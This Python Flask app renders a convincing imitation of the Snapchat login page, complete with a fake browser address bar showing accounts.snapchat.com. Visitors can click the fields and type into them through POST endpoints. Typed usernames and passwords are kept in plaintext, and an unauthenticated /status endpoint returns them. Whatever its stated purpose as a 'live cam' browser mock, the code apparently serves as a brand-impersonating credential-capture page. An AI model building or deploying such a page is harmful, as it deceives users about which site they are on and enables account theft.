import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
from PIL import Image, ImageDraw, ImageFont

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

# === PURE CONTROL STATE - NOTHING PRE-FILLED ===
browser = {
    'username': '',
    'password': '',
    'focused_field': None,      # 'username' or 'password'
    'last_action': 'Click anywhere on the page to start',
    'frame': 0,
    'url': 'https://accounts.snapchat.com/accounts/login'
}

def get_font(size=14, bold=False):
    try:
        path = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf" if bold else "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf"
        return ImageFont.truetype(path, size)
    except:
        return ImageFont.load_default()

def draw_snapchat_login(draw, cx, cy, w, h):
    f = get_font(22, bold=True)
    f2 = get_font(14, bold=True)
    f3 = get_font(15)
    f_label = get_font(11)

    # Card background
    draw.rounded_rectangle([cx, cy, cx+w, cy+h], radius=16, fill='#1f1f1f')

    # Title
    draw.text((cx+18, cy+16), "Log in to Snapchat", fill='white', font=f2)

    y = cy + 58

    # Username / email / phone field
    draw.text((cx+18, y), "Username or email or phone", fill='#888888', font=f_label)
    y += 18
    color = '#ffffff' if browser['focused_field'] == 'username' else '#dddddd'
    draw.rounded_rectangle([cx+16, y, cx+w-16, y+36], radius=8, fill='#2a2a2a')
    text = browser['username'] or ''
    draw.text((cx+26, y+9), text or "Enter username", fill=color, font=f3)

    # Cursor
    if browser['focused_field'] == 'username':
        cursor_x = cx + 26 + len(text) * 8.2
        draw.rectangle([cursor_x, y+7, cursor_x+2, y+29], fill='#3b82f6')

    y += 52

    # Password field
    draw.text((cx+18, y), "Password", fill='#888888', font=f_label)
    y += 18
    color = '#ffffff' if browser['focused_field'] == 'password' else '#888888'
    draw.rounded_rectangle([cx+16, y, cx+w-16, y+36], radius=8, fill='#2a2a2a')
    pw_display = '•' * len(browser['password']) if browser['password'] else ''
    draw.text((cx+26, y+9), pw_display or "Enter password", fill=color, font=f3)

    if browser['focused_field'] == 'password':
        cursor_x = cx + 26 + len(pw_display) * 8.2
        draw.rectangle([cursor_x, y+7, cursor_x+2, y+29], fill='#3b82f6')

    y += 55

    # Big yellow Log In button
    draw.rounded_rectangle([cx+16, y, cx+w-16, y+42], radius=22, fill='#FFFC00')
    draw.text((cx+155, y+10), "Log In", fill='#000000', font=f2)

    y += 60

    # or
    draw.text((cx+180, y), "or", fill='#555555', font=f_label)
    y += 22

    # Social buttons
    draw.rounded_rectangle([cx+16, y, cx+w-16, y+34], radius=22, fill='#2c2c2c')
    draw.text((cx+105, y+8), "Continue with Google", fill='white', font=f_label)
    y += 42

    draw.rounded_rectangle([cx+16, y, cx+w-16, y+34], radius=22, fill='#2c2c2c')
    draw.text((cx+110, y+8), "Continue with Apple", fill='white', font=f_label)
    y += 42

    draw.text((cx+95, y), "Use phone number instead", fill='#666666', font=f_label)

def generate_image():
    browser['frame'] += 1
    w, h = 1280, 720
    img = Image.new('RGB', (w, h), '#0f0f0f')
    draw = ImageDraw.Draw(img)

    f = get_font(13)

    # Browser chrome
    draw.rectangle([0, 0, w, 26], fill='#2c2c2c')
    draw.text((10, 6), "●  ●  ●", fill='#666')
    draw.text((w//2 - 100, 6), "accounts.snapchat.com/accounts/login", fill='#ccc', font=f)

    # Address bar
    draw.rectangle([40, 30, w-40, 52], fill='#1a1a1a', outline='#333')
    draw.text((50, 34), browser['url'], fill='#999', font=f)

    # Snapchat page
    draw.rectangle([0, 58, w, h], fill='#000000')

    # Draw the actual login UI
    card_w = 440
    card_h = 460
    cx = (w - card_w) // 2
    cy = 95

    # Snapchat header
    draw.rectangle([cx, cy, cx+card_w, cy+38], fill='#111111')
    draw.text((cx + 145, cy+8), "Snapchat", fill='#FFFC00', font=get_font(20, bold=True))

    draw_snapchat_login(draw, cx, cy + 38, card_w, card_h - 38)

    # Live bar
    draw.rectangle([0, h-24, w, h], fill='#111111')
    draw.text((10, h-18), f"LIVE CAM • {browser['last_action']} • frame {browser['frame']}", fill='#22c55e', font=f)

    path = os.path.join(STATIC_DIR, 'screenshot.png')
    img.save(path, 'PNG')
    return path

def screenshot_loop():
    while True:
        generate_image()
        time.sleep(0.65)

# ================== CONTROL API ==================

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/click', methods=['POST'])
def handle_click():
    data = request.get_json() or {}
    x = int(data.get('x', 0))
    y = int(data.get('y', 0))

    # These coordinates are tuned for the 1280x720 image
    # Card is roughly centered at x=420-860, y=95-555
    card_left = 420
    card_top = 133   # 95 + 38

    # Username field area
    if 540 < y < 590 and card_left < x < 860:
        browser['focused_field'] = 'username'
        browser['last_action'] = 'Clicked username / phone field'

    # Password field area
    elif 635 < y < 685 and card_left < x < 860:
        browser['focused_field'] = 'password'
        browser['last_action'] = 'Clicked password field'

    # Log In button
    elif 720 < y < 765 and card_left < x < 860:
        browser['last_action'] = 'Clicked Log In'
        browser['focused_field'] = None

    else:
        browser['last_action'] = f'Clicked at ({x},{y})'

    generate_image()
    return jsonify({'ok': True, 'focused': browser['focused_field'], 'action': browser['last_action']})

@app.route('/type', methods=['POST'])
def handle_type():
    data = request.get_json() or {}
    text = data.get('text', '')

    if not browser['focused_field']:
        browser['focused_field'] = 'username'

    if browser['focused_field'] == 'username':
        browser['username'] += text
        browser['last_action'] = f'Typing in username...'
    elif browser['focused_field'] == 'password':
        browser['password'] += text
        browser['last_action'] = 'Typing password...'

    generate_image()
    return jsonify({'ok': True})

@app.route('/key', methods=['POST'])
def handle_key():
    data = request.get_json() or {}
    key = data.get('key', '')

    if key == 'Backspace':
        if browser['focused_field'] == 'username' and browser['username']:
            browser['username'] = browser['username'][:-1]
        elif browser['focused_field'] == 'password' and browser['password']:
            browser['password'] = browser['password'][:-1]
        browser['last_action'] = 'Backspace'

    elif key == 'Enter':
        if browser['focused_field'] == 'password':
            browser['last_action'] = 'Pressed Enter (Log In)'
            browser['focused_field'] = None
        else:
            browser['focused_field'] = 'password'
            browser['last_action'] = 'Pressed Enter'

    generate_image()
    return jsonify({'ok': True, 'action': browser['last_action']})

@app.route('/reset', methods=['POST'])
def reset_browser():
    browser.update({
        'username': '',
        'password': '',
        'focused_field': None,
        'last_action': 'Browser reset to clean login page'
    })
    generate_image()
    return jsonify({'ok': True})

@app.route('/screenshot')
def get_screenshot():
    generate_image()
    resp = send_from_directory(STATIC_DIR, 'screenshot.png')
    resp.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    return resp

@app.route('/status')
def get_status():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        **browser,
        'size': size
    })

@app.before_request
def boot():
    if not hasattr(app, 'booted'):
        app.booted = True
        generate_image()
        threading.Thread(target=screenshot_loop, daemon=True).start()
        print("[LIVE CAM] Full click + type control ready")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))